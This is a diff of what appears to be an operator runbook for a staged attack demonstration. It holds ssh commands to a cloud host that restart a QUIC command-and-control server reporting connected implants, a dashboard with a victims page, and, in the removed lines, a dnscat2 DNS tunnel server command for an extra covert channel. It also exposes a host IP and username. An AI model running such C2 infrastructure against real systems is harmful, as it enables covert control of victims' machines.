@@ -51,7 +51,6 @@ cd /c/Users/jonathan.lim/DConnect/..        # any dir with seed-acme.cmd
   insecure TLS for the dashboard POST; npm/GitHub use public CAs).
 - Hosts-file entries (`hosts.sample`) only matter if you showcase
   `traceroute`/`scan` on jonathan — not needed for the short cut.
-- dnscat is auto-skipped on Windows (`dnscat2.exe` not bundled) — harmless.
 
 ### A4. Snapshot
 
@@ -104,12 +103,6 @@ ssh -i ~/.ssh/google_compute_engine arunkumarsubbiah@34.146.249.74 \
   "pkill -f 'python-c2 q[u]icsvr3'"                   # bracket pattern (never combined with launch)
 ssh -i ~/.ssh/google_compute_engine arunkumarsubbiah@34.146.249.74 \
   '~/quic/start-c2.sh'                                # fresh console: [C2] Implant connected!
-```
-
-Optional extra channel wow (arjun’s install also opens a dnscat session):
-
-```bash
-ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=dns.apexadversary.com
 ```
 
 Dashboard: `https://dns1.apexadversary.com:8443/` (auto-refresh) · `/victims`.
